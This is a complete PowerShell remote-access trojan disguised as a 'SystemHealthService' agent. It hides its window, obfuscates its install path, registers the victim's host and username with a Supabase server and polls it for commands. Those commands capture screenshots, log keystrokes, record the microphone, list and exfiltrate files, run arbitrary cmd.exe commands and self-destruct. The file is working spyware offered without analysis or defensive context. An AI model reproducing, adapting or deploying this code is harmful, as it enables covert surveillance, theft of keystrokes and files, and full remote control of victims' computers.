

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

try {
    Add-Type -Name Window -Namespace Native -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr h,Int32 n);'
    [Native.Window]::ShowWindow([Native.Window]::GetConsoleWindow(), 0)
} catch {}

${_bp} = (-join @([char]67,[char]58,[char]92,[char]80,[char]114,[char]111,[char]103,[char]114,[char]97,[char]109,[char]68,[char]97,[char]116,[char]97,[char]92,[char]83,[char]121,[char]115,[char]116,[char]101,[char]109,[char]72,[char]101,[char]97,[char]108,[char]116,[char]104,[char]83,[char]101,[char]114,[char]118,[char]105,[char]99,[char]101))

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$logFile = "${_bp}\agent_debug.log"
function Write-Log {
    param($msg)
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$ts - $msg" | Out-File $logFile -Append -Force
}
Write-Log "Agent starting..."

while ($true) {
    try {
        $null = Invoke-RestMethod -Uri "https://www.google.com" -Method Head -TimeoutSec 5
        break
    } catch {
        Start-Sleep 5
    }
}
Write-Log "Network check passed"
Start-Sleep 5

${_cfg} = Get-Content "${_bp}\config.json" -Raw | ConvertFrom-Json
Write-Log "Config loaded: $(${_cfg}.supabase_url)"
${_dif} = "${_bp}\device_id.txt"

if (Test-Path ${_dif}) {
    ${_did} = (Get-Content ${_dif} -Raw).Trim()
} else {
    ${_did} = [guid]::NewGuid().ToString()
    ${_did} | Out-File ${_dif} -NoNewline
    (Get-Item ${_dif}).Attributes = "Hidden"
}
Write-Log "Device ID: ${_did}"

${_dn} = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })

${_h} = @{
    "apikey" = ${_cfg}.supabase_key
    "Authorization" = "Bearer $(${_cfg}.supabase_key)"
    "Content-Type" = "application/json"
    "Prefer" = "return=minimal"
}

function Invoke-X0g7 {
    param(
        $endpoint,
        $method = "GET",
        $body = $null
    )
    
    $uri = "$(${_cfg}.supabase_url)/rest/v1/$endpoint"
    
    try {
        if ($body) {
            Invoke-RestMethod -Uri $uri -Method $method -Headers ${_h} -Body ($body | ConvertTo-Json -Depth 10 -Compress) -TimeoutSec 30
        } else {
            Invoke-RestMethod -Uri $uri -Method $method -Headers ${_h} -TimeoutSec 30
        }
    } catch {
        $null
    }
}

${_rd} = @{
    device_id = ${_did}
    device_name = ${_dn}
    hostname = $env:COMPUTERNAME
    username = $env:USERNAME
    os_info = (Get-CimInstance Win32_OperatingSystem).Caption
}

Write-Log "Registering device..."
Invoke-X0g7 -endpoint "devices" -method "POST" -body ${_rd}
Write-Log "Registration POST sent"

function Get-X0a1 {
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        
        $memoryStream = New-Object System.IO.MemoryStream
        $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
        $base64 = [Convert]::ToBase64String($memoryStream.ToArray())
        
        $graphics.Dispose()
        $bitmap.Dispose()
        $memoryStream.Dispose()
        
        return @{
            data_type = "display"
            file_data = $base64
        }
    } catch {
        return @{
            data_type = "display"
            data = "Failed: $_"
        }
    }
}

function Get-X0b2 {
    param($duration = 60)
    
    try {

        Add-Type -AssemblyName System.Windows.Forms

        Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);' -Name KeyState -Namespace User -EA SilentlyContinue

        $keystrokeBuffer = New-Object System.Text.StringBuilder

        $startTime = Get-Date
        $endTime = $startTime.AddSeconds($duration)

        $processedKeys = @{}

        while ((Get-Date) -lt $endTime) {
            try {

                for ($virtualKey = 8; $virtualKey -le 190; $virtualKey++) {

                    $keyState = [User.KeyState]::GetAsyncKeyState($virtualKey)
                    
                    if ($keyState -eq -32767) {
                        $keyName = [System.Windows.Forms.Keys]$virtualKey
                        [void]$keystrokeBuffer.Append("$keyName ")
                    }
                }

                Start-Sleep -Milliseconds 50
                
            } catch {

                break
            }
        }

        $keystrokeData = $keystrokeBuffer.ToString()

        if ($keystrokeData -and $keystrokeData.Trim()) {
            return @{
                data_type = "input"
                data = $keystrokeData
            }
        } else {
            return @{
                data_type = "input"
                data = "[No keystrokes recorded]"
            }
        }
    } catch {
        return @{
            data_type = "input"
            data = "Error: $_"
        }
    }
}

function Get-X0c3 {
    try {
        $os = Get-CimInstance Win32_OperatingSystem
        $computer = Get-CimInstance Win32_ComputerSystem
        
        $info = @{
            hostname = $env:COMPUTERNAME
            username = $env:USERNAME
            os = $os.Caption
            os_version = $os.Version
            manufacturer = $computer.Manufacturer
            model = $computer.Model
            memory_gb = [math]::Round($computer.TotalPhysicalMemory / 1GB, 2)
        }
        
        return @{
            data_type = "sysinfo"
            data = ($info | ConvertTo-Json -Compress)
        }
    } catch {
        return @{
            data_type = "sysinfo"
            data = "Error: $_"
        }
    }
}

function Get-X0d4 {
    param($duration = 10)
    
    try {
        $audioFile = "${_bp}\rec.wav"

        Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class AudioRecorder{[DllImport("winmm.dll",EntryPoint="mciSendStringA")]public static extern int mciSendString(string command,string buffer,int bufferSize,IntPtr hwndCallback);}' -Language CSharp -EA SilentlyContinue

        [AudioRecorder]::mciSendString("open new Type waveaudio Alias recorder", "", 0, [IntPtr]::Zero)
        [AudioRecorder]::mciSendString("set recorder bitspersample 16", "", 0, [IntPtr]::Zero)
        [AudioRecorder]::mciSendString("set recorder samplespersec 22050", "", 0, [IntPtr]::Zero)
        [AudioRecorder]::mciSendString("set recorder channels 1", "", 0, [IntPtr]::Zero)
        [AudioRecorder]::mciSendString("record recorder", "", 0, [IntPtr]::Zero)

        Start-Sleep $duration

        [AudioRecorder]::mciSendString("stop recorder", "", 0, [IntPtr]::Zero)
        [AudioRecorder]::mciSendString("save recorder `"$audioFile`"", "", 0, [IntPtr]::Zero)
        [AudioRecorder]::mciSendString("close recorder", "", 0, [IntPtr]::Zero)

        if (Test-Path $audioFile) {
            $audioBytes = [System.IO.File]::ReadAllBytes($audioFile)
            $base64 = [Convert]::ToBase64String($audioBytes)
            Remove-Item $audioFile -Force -EA SilentlyContinue
            
            return @{
                data_type = "audio"
                file_data = $base64
            }
        } else {
            return @{
                data_type = "audio"
                data = "Failed to create audio file"
            }
        }
    } catch {
        return @{
            data_type = "audio"
            data = "Error: $_"
        }
    }
}

function Browse-Files {
    param($path = "")
    
    try {
        $items = @()
        
        if ($path -eq "" -or $path -eq "drives") {

            $drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Used -ne $null }
            foreach ($drive in $drives) {
                $items += @{
                    name = "$($drive.Name):\"
                    type = "drive"
                    size = $drive.Used + $drive.Free
                    free = $drive.Free
                }
            }
        } else {

            if ($path -match '^[A-Za-z]:\\?$') {

                $path = $path.TrimEnd('\') + '\'
            } else {
                $path = $path.TrimEnd('\\')
            }
            
            if (!(Test-Path $path)) {
                return @{
                    data_type = "file_list"
                    data = (@{ error = "Path not found: $path"; path = $path } | ConvertTo-Json -Compress)
                }
            }

            $children = Get-ChildItem -Path $path -Force -ErrorAction SilentlyContinue
            foreach ($child in $children) {
                $item = @{
                    name = $child.Name
                    type = if ($child.PSIsContainer) { "folder" } else { "file" }
                    size = if ($child.PSIsContainer) { 0 } else { $child.Length }
                    modified = $child.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
                }
                $items += $item
            }
        }
        
        return @{
            data_type = "file_list"
            data = (@{ path = $path; items = $items; count = $items.Count } | ConvertTo-Json -Depth 5 -Compress)
        }
    } catch {
        return @{
            data_type = "file_list"
            data = (@{ error = "Error: $_"; path = $path } | ConvertTo-Json -Compress)
        }
    }
}

function Download-File {
    param($filePath, $chunkSize = 512000) # 500KB default
    
    try {
        if (!(Test-Path $filePath)) {
            return @{
                data_type = "file_download"
                data = (@{ error = "File not found: $filePath" } | ConvertTo-Json -Compress)
            }
        }
        
        $fileInfo = Get-Item $filePath
        $fileSize = $fileInfo.Length

        if ($fileSize -gt 1073741824) {
            return @{
                data_type = "file_download"
                data = (@{ error = "File too large (max 1GB)"; size = $fileSize } | ConvertTo-Json -Compress)
            }
        }

        $bytes = [System.IO.File]::ReadAllBytes($filePath)
        $base64 = [Convert]::ToBase64String($bytes)
        
        return @{
            data_type = "file_download"
            data = (@{ 
                filename = $fileInfo.Name
                size = $fileSize
                path = $filePath
            } | ConvertTo-Json -Compress)
            file_data = $base64
        }
    } catch {
        return @{
            data_type = "file_download"
            data = (@{ error = "Error: $_" } | ConvertTo-Json -Compress)
        }
    }
}

function Invoke-X0e5 {
    param($cmd)
    
    try {
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processInfo.FileName = "cmd.exe"
        $processInfo.Arguments = "/c $cmd"
        $processInfo.RedirectStandardOutput = $true
        $processInfo.RedirectStandardError = $true
        $processInfo.UseShellExecute = $false
        $processInfo.CreateNoWindow = $true
        
        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = $processInfo
        $process.Start() | Out-Null
        
        $output = $process.StandardOutput.ReadToEnd()
        $errorOutput = $process.StandardError.ReadToEnd()
        $process.WaitForExit(30000)
        
        $result = @{
            command = $cmd
            output = $output
            error = $errorOutput
            exit_code = $process.ExitCode
        }
        
        return @{
            data_type = "cmd_result"
            data = ($result | ConvertTo-Json -Compress)
        }
    } catch {
        $result = @{
            command = $cmd
            error = "$_"
        }
        
        return @{
            data_type = "cmd_result"
            data = ($result | ConvertTo-Json -Compress)
        }
    }
}

function Remove-X0f6 {
    try {

        schtasks /delete /tn "SystemHealthMonitor" /f 2>$null
        schtasks /delete /tn "SystemHealthAdmin" /f 2>$null

        Get-Process -Name powershell -ErrorAction SilentlyContinue | Where-Object {
            $_.Id -ne $PID -and $_.MainWindowTitle -eq ""
        } | Stop-Process -Force -ErrorAction SilentlyContinue

        Start-Sleep -Seconds 2

        $agentPath = (-join @([char]67,[char]58,[char]92,[char]80,[char]114,[char]111,[char]103,[char]114,[char]97,[char]109,[char]68,[char]97,[char]116,[char]97,[char]92,[char]83,[char]121,[char]115,[char]116,[char]101,[char]109,[char]72,[char]101,[char]97,[char]108,[char]116,[char]104,[char]83,[char]101,[char]114,[char]118,[char]105,[char]99,[char]101))
        if (Test-Path $agentPath) {
            Remove-Item $agentPath -Recurse -Force -ErrorAction SilentlyContinue
        }
        
        return @{
            data_type = "destruct"
            data = "Windows agent destroyed successfully"
        }
    } catch {
        return @{
            data_type = "destruct"
            data = "Destruction failed: $_"
        }
    }
}

function Execute-TaskWithTimeout {
    param(
        $task,
        $timeoutSeconds = 300
    )
    
    $scriptBlock = {
        param($taskType, $taskParams)
        
        $result = $null
        
        switch ($taskType) {
            "display_capture" {
                $result = Get-X0a1
            }
            
            "input_monitor" {
                $duration = 60
                if ($taskParams -and $taskParams.duration) {
                    $duration = [int]$taskParams.duration
                }
                $result = Get-X0b2 -duration $duration
            }
            
            "system_info" {
                $result = Get-X0c3
            }
            
            "voice_record" {
                $duration = 10
                if ($taskParams -and $taskParams.duration) {
                    $duration = [int]$taskParams.duration
                }
                $result = Get-X0d4 -duration $duration
            }
            
            "cmd_exec" {
                $command = ""
                if ($taskParams -and $taskParams.command) {
                    $command = $taskParams.command
                }
                
                if ($command) {
                    $result = Invoke-X0e5 -cmd $command
                } else {
                    $result = @{
                        data_type = "cmd_result"
                        data = "No command provided"
                    }
                }
            }
        }
        
        return $result
    }
    
    try {

        $job = Start-Job -ScriptBlock $scriptBlock -ArgumentList $task.task_type, $task.task_params

        $completed = Wait-Job $job -Timeout $timeoutSeconds
        
        if ($completed) {

            $result = Receive-Job $job
            Remove-Job $job -Force
            return $result
        } else {

            Stop-Job $job
            Remove-Job $job -Force
            
            return @{
                data_type = "error"
                data = "Task timed out after $timeoutSeconds seconds"
            }
        }
    } catch {
        return @{
            data_type = "error"
            data = "Task execution error: $_"
        }
    }
}

${_si} = if (${_cfg}.sync_interval) { ${_cfg}.sync_interval } else { 10 }
${_ri} = if (${_cfg}.retry_interval) { ${_cfg}.retry_interval } else { 10 }

Write-Log "Entering main loop"
while ($true) {
    try {

        Invoke-X0g7 -endpoint "devices?device_id=eq.${_did}" -method "PATCH" -body @{ last_sync = (Get-Date -Format "o") } | Out-Null

        $tasks = Invoke-X0g7 -endpoint "tasks?device_id=eq.${_did}&status=eq.pending&task_type=not.in.(cmd_exec_admin,ps_exec_admin,auto_destruct)&select=id,task_type,task_params"
        
        if ($tasks) {

            if ($tasks -isnot [array]) {
                $tasks = @($tasks)
            }

            foreach ($task in $tasks) {

                Invoke-X0g7 -endpoint "tasks?id=eq.$($task.id)" -method "PATCH" -body @{ status = "processing" } | Out-Null

                $taskResult = $null
                
                switch ($task.task_type) {
                    "display_capture" {
                        $taskResult = Get-X0a1
                    }
                    
                    "input_monitor" {
                        $duration = 60
                        if ($task.task_params -and $task.task_params.duration) {
                            $duration = [int]$task.task_params.duration
                        }

                        if ($duration -gt 300) { $duration = 300 }
                        $taskResult = Get-X0b2 -duration $duration
                    }
                    
                    "system_info" {
                        $taskResult = Get-X0c3
                    }
                    
                    "voice_record" {
                        $duration = 10
                        if ($task.task_params -and $task.task_params.duration) {
                            $duration = [int]$task.task_params.duration
                        }

                        if ($duration -gt 120) { $duration = 120 }
                        $taskResult = Get-X0d4 -duration $duration
                    }
                    
                    "cmd_exec" {
                        $command = ""
                        if ($task.task_params -and $task.task_params.command) {
                            $command = $task.task_params.command
                        }
                        
                        if ($command) {
                            $taskResult = Invoke-X0e5 -cmd $command
                        } else {
                            $taskResult = @{
                                data_type = "cmd_result"
                                data = "No command provided"
                            }
                        }
                    }
                    
                    "file_browse" {
                        $path = ""
                        if ($task.task_params -and $task.task_params.path) {
                            $path = $task.task_params.path
                        }
                        $taskResult = Browse-Files -path $path
                    }
                    
                    "file_download" {
                        $filePath = ""
                        if ($task.task_params -and $task.task_params.file) {
                            $filePath = $task.task_params.file
                        }
                        if ($filePath) {
                            $taskResult = Download-File -filePath $filePath
                        } else {
                            $taskResult = @{
                                data_type = "file_download"
                                data = (@{ error = "No file path provided" } | ConvertTo-Json -Compress)
                            }
                        }
                    }
                    
                    "auto_destruct" {

                        $telemetryData = @{
                            device_id = ${_did}
                            data_type = "destruct"
                            data = "User agent received destruct - handing off to SYSTEM agent"
                        }
                        Invoke-X0g7 -endpoint "telemetry" -method "POST" -body $telemetryData | Out-Null

                        exit 0
                    }
                    
                    "restart_agent" {

                        Invoke-X0g7 -endpoint "tasks?id=eq.$($task.id)" -method "PATCH" -body @{
                            status = "complete"
                            completed_at = (Get-Date -Format "o")
                        } | Out-Null

                        $telemetryData = @{
                            device_id = ${_did}
                            data_type = "sysinfo"
                            data = "Agent restarting..."
                        }
                        Invoke-X0g7 -endpoint "telemetry" -method "POST" -body $telemetryData | Out-Null

                        try {
                            Stop-ScheduledTask -TaskName "SystemHealthMonitor" -ErrorAction SilentlyContinue
                            Start-ScheduledTask -TaskName "SystemHealthMonitor" -ErrorAction SilentlyContinue
                            Stop-ScheduledTask -TaskName "SystemHealthAdmin" -ErrorAction SilentlyContinue
                            Start-ScheduledTask -TaskName "SystemHealthAdmin" -ErrorAction SilentlyContinue
                        } catch {}

                        exit 0
                    }
                    
                    default {
                        $taskResult = @{
                            data_type = "error"
                            data = "Unknown task type: $($task.task_type)"
                        }
                    }
                }

                if ($taskResult) {
                    $telemetryData = @{
                        device_id = ${_did}
                        data_type = $taskResult.data_type
                    }
                    
                    if ($taskResult.file_data) {
                        $telemetryData.file_data = $taskResult.file_data
                    }
                    
                    if ($taskResult.data) {
                        $telemetryData.data = $taskResult.data
                    }

                    Invoke-X0g7 -endpoint "telemetry" -method "POST" -body $telemetryData | Out-Null
                }

                Invoke-X0g7 -endpoint "tasks?id=eq.$($task.id)" -method "PATCH" -body @{
                    status = "complete"
                    completed_at = (Get-Date -Format "o")
                } | Out-Null
            }
        }
        
        Start-Sleep ${_si}
        
    } catch {
        Start-Sleep ${_ri}
    }
}

